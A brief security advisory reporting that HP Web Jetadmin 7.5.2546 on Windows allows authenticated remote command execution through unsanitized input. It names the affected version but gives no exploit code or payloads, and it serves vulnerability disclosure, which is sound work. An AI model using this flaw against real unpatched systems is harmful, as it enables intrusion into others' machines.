Reportedly HP web Jetadmin is prone to a remote arbitrary command execution vulnerability. This issue is due to a failure of the application to properly validate and sanitize user supplied input.

Successful exploitation of this issue will allow a malicious user to execute arbitrary commands on the affected system.

This issue has been tested with an authenticated account on HP Web Jetadmin version 7.5.2546 running on a Windows platform.
